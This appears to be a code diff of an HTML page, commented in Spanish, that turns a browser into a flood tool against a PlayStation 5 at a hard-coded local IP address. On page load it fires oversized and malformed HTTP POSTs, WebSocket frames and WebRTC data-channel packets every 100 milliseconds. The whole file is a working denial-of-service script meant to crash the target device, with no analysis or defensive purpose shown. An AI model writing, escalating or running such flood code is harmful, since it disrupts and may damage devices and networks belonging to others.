@@ -1,70 +1,89 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS5 Ethernet Bruteforce</title>
+    <title>PS5 Network Bruteforce - Max Power</title>
     <style>
         body {
-            background-color: #000;
-            color: #0f0;
+            background-color: black;
+            color: lime;
             font-family: monospace;
             padding: 20px;
         }
     </style>
 </head>
 <body>
-    <h1>PS5 Ethernet Bruteforce Stress</h1>
+    <h1>PS5 Network Bruteforce - Max Power</h1>
     <div id="status">Preparando...</div>
 
     <script>
-        const PS5_IP = "192.168.137.200"; // IP de la PS5
+        const PS5_IP = "192.168.137.200";
 
-        function floodFetch() {
-            for (let i = 0; i < 1000; i++) {
-                try {
-                    fetch(`http://${PS5_IP}/crash_me_${Math.random()}`, {
-                        method: 'POST',
-                        headers: {
-                            'X-Payload': 'A'.repeat(50000),
-                        },
-                        body: 'B'.repeat(100000),
-                        mode: 'no-cors',
-                        cache: 'no-store',
-                        keepalive: true,
-                    }).catch(() => {});
-                } catch (e) {}
+        function randomString(length) {
+            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-=_+[]{}|;:',.<>/?`~";
+            let result = '';
+            for (let i = 0; i < length; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+
+        function crashFetch() {
+            for (let i = 0; i < 500; i++) {
+                fetch(`http://${PS5_IP}/${randomString(500)}`, {
+                    method: 'POST',
+                    headers: {
+                        [randomString(100)]: randomString(10000),  // Header corrupto gigante
+                        "Content-Length": "99999999" // Header absurdo
+                    },
+                    body: randomString(200000),
+                    mode: 'no-cors',
+                    cache: 'no-store',
+                    keepalive: true,
+                }).catch(() => {});
             }
         }
 
-        function floodWebSocket() {
+        function crashWebSocket() {
             for (let i = 0; i < 100; i++) {
                 try {
-                    let ws = new WebSocket(`ws://${PS5_IP}/crazy_socket_${Math.random()}`);
-                    ws.onerror = () => {}; // Ignorar errores
+                    let ws = new WebSocket(`ws://${PS5_IP}/${randomString(100)}`);
+                    ws.onopen = () => {
+                        ws.send(randomString(65535)); // Frame WebSocket gigante
+                        ws.send("\x80\xff\xff\xff");   // Frame WebSocket mal formado
+                        ws.close();
+                    };
+                    ws.onerror = () => {};
                 } catch (e) {}
             }
         }
 
-        function floodWebRTC() {
-            for (let i = 0; i < 50; i++) {
+        function crashWebRTC() {
+            for (let i = 0; i < 100; i++) {
                 try {
-                    let pc = new RTCPeerConnection({
+                    const pc = new RTCPeerConnection({
                         iceServers: [{ urls: `stun:${PS5_IP}:3478` }]
                     });
-
-                    pc.createDataChannel("crash" + Math.random());
-                    pc.createOffer().then(offer => {
-                        return pc.setLocalDescription(offer);
-                    }).catch(() => {});
+                    const channel = pc.createDataChannel(randomString(50));
+                    channel.onopen = () => {
+                        channel.send(randomString(65535)); // Paquetes gigantes
+                        channel.send("\xff\xff\xff\xff"); // Datos rotos
+                    };
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
                 } catch (e) {}
             }
+        }
+
+        function crashLoop() {
+            crashFetch();
+            crashWebSocket();
+            crashWebRTC();
         }
 
         function startAttack() {
-            document.getElementById('status').textContent = "Ataque en curso contra " + PS5_IP;
+            document.getElementById('status').textContent = `¡Atacando ${PS5_IP}!`;
 
-            setInterval(floodFetch, 300);
-            setInterval(floodWebSocket, 1000);
-            setInterval(floodWebRTC, 500);
+            // Lanza cada 100ms (¡rápido!)
+            setInterval(crashLoop, 100);
         }
 
         window.onload = startAttack;
